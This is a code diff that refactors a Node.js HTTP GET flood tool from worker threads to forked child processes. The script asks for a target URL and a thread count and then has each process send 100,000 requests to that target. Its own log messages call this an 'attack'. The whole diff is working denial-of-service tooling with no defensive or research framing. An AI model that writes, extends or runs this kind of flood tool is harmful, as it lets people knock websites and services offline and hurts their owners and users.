@@ -1,8 +1,8 @@
 const http = require('http');
 const https = require('https');
 const readline = require('readline');
+const { fork } = require('child_process');
 const url = require('url');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 
 // Create interface for reading input from the console
 const rl = readline.createInterface({
@@ -10,36 +10,8 @@ const rl = readline.createInterface({
   output: process.stdout
 });
 
-if (isMainThread) {
-  // Main thread: Prompt user for input and start workers
-  rl.question('Enter target URL (e.g., http://example.com): ', (targetUrl) => {
-    rl.question('Enter the number of threads: ', (threads) => {
-      const threadCount = parseInt(threads, 10);
-
-      if (isNaN(threadCount)) {
-        console.error('Invalid number of threads');
-        rl.close();
-        return;
-      }
-
-      console.log(`Starting attack with ${threadCount} threads, each sending 100,000 requests.`);
-
-      // Start the specified number of threads
-      for (let i = 0; i < threadCount; i++) {
-        new Worker(__filename, {
-          workerData: {
-            targetUrl,
-            requestsPerThread: 50000 // Each thread sends 50,000 requests twice
-          }
-        });
-      }
-
-      rl.close();
-    });
-  });
-} else {
-  // Worker thread: Perform the attack
-  const { targetUrl, requestsPerThread } = workerData;
+// Function to start the HTTP GET flood attack in a child process
+const startAttack = (targetUrl, requestsPerThread) => {
   const parsedUrl = url.parse(targetUrl);
   const protocol = parsedUrl.protocol === 'https:' ? https : http;
   let requestCount = 0;
@@ -82,4 +54,39 @@ if (isMainThread) {
   };
 
   runAttack();
+};
+
+// Main function to handle user input and start child processes
+const main = () => {
+  rl.question('Enter target URL (e.g., http://example.com): ', (targetUrl) => {
+    rl.question('Enter the number of threads: ', (threads) => {
+      const threadCount = parseInt(threads, 10);
+      const requestsPerThread = 50000; // Each thread sends 50,000 requests twice
+
+      if (isNaN(threadCount)) {
+        console.error('Invalid number of threads');
+        rl.close();
+        return;
+      }
+
+      console.log(`Starting attack with ${threadCount} threads, each sending 100,000 requests.`);
+
+      // Start the specified number of child processes
+      for (let i = 0; i < threadCount; i++) {
+        const child = fork(__filename);
+        child.send({ targetUrl, requestsPerThread });
+      }
+
+      rl.close();
+    });
+  });
+};
+
+// Child process message handler
+if (process.send) {
+  process.on('message', ({ targetUrl, requestsPerThread }) => {
+    startAttack(targetUrl, requestsPerThread);
+  });
+} else {
+  main();
 }
